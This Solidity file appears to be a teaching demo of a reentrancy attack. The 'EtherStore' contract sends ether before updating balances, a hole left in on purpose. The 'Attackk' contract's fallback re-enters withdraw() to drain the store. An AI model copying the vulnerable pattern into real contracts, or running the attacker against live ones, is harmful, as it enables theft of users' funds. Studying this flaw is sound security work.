//SPDX-License-Identifier:MIT
pragma solidity 0.6.10;

contract EtherStore{
   
   mapping(address=>uint) public balances;


   function deposit() public payable{
    balances[msg.sender]+=msg.value;
   }

   function withdraw(uint _amount) public payable {
    require(balances[msg.sender]>=_amount);

    (bool sent ,) =msg.sender.call{value:_amount}("");
     require(sent , "Failed to send ether");
    balances[msg.sender]-=_amount;

   }

   function getBalance() public view returns(uint){
        return address(this).balance;
          
    }

}

contract Attackk{
    EtherStore public etherstore1;

    constructor (address _etherStoreAddress) public {
        etherstore1 = EtherStore(_etherStoreAddress);
    }

    fallback() external payable {
        if(address(etherstore1).balance >= 1 ether){
            etherstore1.withdraw(1 ether);
        }
    }

    function attack() external payable{
        require(msg.value>=1 ether);

        etherstore1.deposit{value : 1 ether}();
        etherstore1.withdraw(1 ether);
    }

function getbalance() public view returns(uint) {
    return address(this).balance;
}

  
} 
